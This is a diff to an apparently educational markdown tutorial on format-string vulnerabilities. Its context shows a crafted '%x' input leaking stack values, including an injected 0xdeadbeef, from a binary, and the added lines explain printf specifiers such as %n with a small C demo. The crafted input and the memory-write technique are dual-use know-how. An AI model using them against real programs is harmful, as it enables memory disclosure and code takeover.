@@ -59,4 +59,45 @@ $ ./format-string $(python -c 'print "\xef\xbe\xad\xde" + "%x." * 100')
 ﾭ�ffbb11c5.c8.565ad22b.0.0.0.ffbb0d04.0.deadbeef.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.5d688c00.ffbb0c70.0.0.f7dcdee5.f7f9a000.f7f9a000.
 ```
 
-You see the value `0xdeadbeef` in the output.
+You see the value `0xdeadbeef` in the output. With different specifiers, we can write to this address or read what in this address.
+
+## Format string specifiers
+
+1. %d - decimal(int) - value.
+2. %u - unsigned decimal(unsigned int) - value.
+3. %x - hexadecimal(unsigned int) - value.
+4. %s - string((const) unsigned char *) - reference.
+5. %n - number of bytes written so far(* int) - reference.
+6. %p - show what the pointer contains - value.
+
+### Try different specifiers
+
+```C
+#include <stdio.h>
+
+// gcc specifiers.c -o specifiers -m32
+
+int main(int argc, char *argv[]){
+  int num = -824;
+  printf("Signed int: %d\n", num);
+  unsigned int num2 = 10000;
+  printf("Unsigned int: %u\n", num2);
+  printf("Hexadecimal: %x\n", num);
+  int *p = &num2;
+  printf("Pointer: %p\n", p);
+  const char *s = "Some string";
+  printf("String: %s\n", s);
+  int *count = &num2;
+  printf("Number of bytes written: %n\n", count);
+  printf("%u\n", *count);
+  return 0;
+}
+```
+
+On the last one, it will write the number of bytes written at the address within count pointer or num2, so, then I wrote this value and it's 25 bytes, which you can determine in python interpreter:
+```bash
+>>> len('Number of bytes written: ')
+25
+```
+
+## Read arbitrary data
